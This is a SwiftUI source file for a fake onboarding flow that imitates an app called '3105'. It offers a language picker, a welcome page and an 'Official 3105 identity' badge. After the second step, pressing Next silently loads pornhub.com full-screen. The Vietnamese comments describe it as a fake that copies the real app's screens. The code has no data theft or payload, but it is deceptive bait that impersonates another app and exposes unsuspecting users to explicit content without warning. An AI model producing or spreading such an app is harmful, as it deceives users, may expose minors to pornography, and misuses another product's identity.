import SwiftUI

// Fake 3105: onboarding that theo anh that (Step 1 ngon ngu, Step 2 welcome),
// an Next o Welcome thi dieu huong qua Pornhub.
struct ContentView: View {
    // 0 = onboarding 3105, 1 = Pornhub
    @State private var phase: Int = 0
    @State private var step: Int = 0
    @State private var selectedLanguage: String = "English"

    // Mau cam cua 3105 (dark mode)
    private let accent = Color(red: 1.00, green: 0.64, blue: 0.42)
    private let cardBG = Color(uiColor: .secondarySystemBackground)

    var body: some View {
        ZStack {
            if phase == 1 {
                WebView(url: URL(string: "https://pornhub.com")!)
                    .ignoresSafeArea()
            } else {
                onboarding
            }
        }
        .preferredColorScheme(.dark)
    }

    // MARK: - Onboarding
    private var onboarding: some View {
        ZStack {
            Color.black.ignoresSafeArea()

            VStack(spacing: 0) {
                header
                ScrollView(.vertical, showsIndicators: false) {
                    if step == 0 {
                        languagePage
                    } else {
                        welcomePage
                    }
                }
            }
        }
        .safeAreaInset(edge: .bottom, spacing: 0) {
            controls
        }
        .tint(accent)
    }

    private var header: some View {
        VStack(spacing: 10) {
            HStack(spacing: 6) {
                ForEach(0..<4, id: \.self) { i in
                    Capsule()
                        .fill(i <= step ? accent : Color.secondary.opacity(0.22))
                        .frame(height: 4)
                        .frame(maxWidth: i == step ? 28 : 18)
                }
            }
            .frame(maxWidth: 560)
            .padding(.horizontal, 20)

            Text("Step \(step + 1) of 4")
                .font(.caption.weight(.medium))
                .foregroundStyle(.secondary)
        }
        .padding(.top, 16)
        .padding(.bottom, 8)
        .frame(maxWidth: .infinity)
        .background(Color.black)
    }

    private var languagePage: some View {
        VStack(spacing: 24) {
            Image("fox_logo")
                .resizable()
                .scaledToFit()
                .frame(width: 100, height: 100)
                .clipShape(RoundedRectangle(cornerRadius: 22, style: .continuous))

            VStack(spacing: 8) {
                Text("Choose your language")
                    .font(.title2.weight(.bold))
                    .multilineTextAlignment(.center)
                Text("You can change this later in Settings.")
                    .font(.subheadline)
                    .foregroundStyle(.secondary)
                    .multilineTextAlignment(.center)
            }

            VStack(spacing: 12) {
                ForEach(["English", "Tiếng Việt", "简体中文"], id: \.self) { option in
                    let isSelected = selectedLanguage == option
                    Button {
                        selectedLanguage = option
                    } label: {
                        HStack(spacing: 12) {
                            Text(option)
                                .font(.body.weight(.semibold))
                                .foregroundStyle(.primary)
                            Spacer()
                            if isSelected {
                                Image(systemName: "checkmark.circle.fill")
                                    .foregroundStyle(accent)
                                    .font(.title3)
                            } else {
                                Image(systemName: "circle")
                                    .foregroundStyle(.secondary.opacity(0.5))
                            }
                        }
                        .padding(.horizontal, 16)
                        .frame(minHeight: 56)
                        .background(
                            RoundedRectangle(cornerRadius: 10, style: .continuous)
                                .fill(cardBG)
                                .overlay(
                                    RoundedRectangle(cornerRadius: 10, style: .continuous)
                                        .stroke(isSelected ? accent : Color.secondary.opacity(0.12), lineWidth: 1)
                                )
                        )
                    }
                    .buttonStyle(.plain)
                }
            }

            Text("Selected: \(selectedLanguage)")
                .font(.caption)
                .foregroundStyle(.secondary)
                .multilineTextAlignment(.center)
        }
        .frame(maxWidth: 560)
        .frame(maxWidth: .infinity)
        .padding(.horizontal, 20)
        .padding(.top, 12)
        .padding(.bottom, 28)
    }

    private var welcomePage: some View {
        VStack(spacing: 20) {
            ZStack {
                RoundedRectangle(cornerRadius: 14, style: .continuous)
                    .fill(cardBG)
                    .overlay(
                        RoundedRectangle(cornerRadius: 14, style: .continuous)
                            .stroke(accent.opacity(0.3), lineWidth: 1)
                    )
                Image(systemName: "sparkles")
                    .font(.system(size: 28, weight: .medium))
                    .foregroundStyle(accent)
            }
            .frame(width: 72, height: 72)

            VStack(spacing: 10) {
                Text("Welcome to 3105")
                    .font(.title2.weight(.bold))
                    .multilineTextAlignment(.center)
            }

            VStack(alignment: .leading, spacing: 16) {
                featureRow(icon: "shippingbox.fill", text: "Browse & install packages from the repository")
                featureRow(icon: "sparkles", text: "Manage app caches & data")
                featureRow(icon: "doc.text.fill", text: "Apply & share file patches")
            }
            .padding(16)
            .background(cardBG, in: RoundedRectangle(cornerRadius: 16, style: .continuous))

            Label("Official 3105 identity", systemImage: "checkmark.seal.fill")
                .font(.footnote.weight(.semibold))
                .foregroundStyle(accent)
                .padding(.horizontal, 14)
                .padding(.vertical, 10)
                .background(cardBG, in: RoundedRectangle(cornerRadius: 8, style: .continuous))
        }
        .frame(maxWidth: 560)
        .frame(maxWidth: .infinity)
        .padding(.horizontal, 20)
        .padding(.top, 12)
        .padding(.bottom, 28)
    }

    private func featureRow(icon: String, text: String) -> some View {
        HStack(alignment: .top, spacing: 12) {
            Image(systemName: icon)
                .font(.system(size: 20, weight: .medium))
                .foregroundStyle(accent)
                .frame(width: 24)
            Text(text)
                .font(.body)
                .foregroundStyle(.primary)
                .fixedSize(horizontal: false, vertical: true)
        }
    }

    private var controls: some View {
        VStack(spacing: 12) {
            HStack(spacing: 12) {
                if step != 0 {
                    Button {
                        withAnimation(.easeInOut(duration: 0.24)) { step -= 1 }
                    } label: {
                        Label("Back", systemImage: "chevron.left")
                            .frame(maxWidth: .infinity)
                    }
                    .buttonStyle(.bordered)
                    .controlSize(.large)
                }

                Button {
                    if step == 0 {
                        withAnimation(.easeInOut(duration: 0.24)) { step = 1 }
                    } else {
                        // Het Welcome -> dieu huong qua Pornhub (khong popup)
                        phase = 1
                    }
                } label: {
                    HStack(spacing: 6) {
                        Text("Next")
                        Image(systemName: "chevron.right")
                            .font(.caption.weight(.semibold))
                    }
                    .frame(maxWidth: .infinity)
                }
                .buttonStyle(.borderedProminent)
                .controlSize(.large)
            }
            .frame(maxWidth: 560)
            .padding(.horizontal, 20)
        }
        .padding(.top, 12)
        .padding(.bottom, 10)
        .frame(maxWidth: .infinity)
        .background(.bar)
        .overlay(alignment: .top) { Divider() }
    }
}
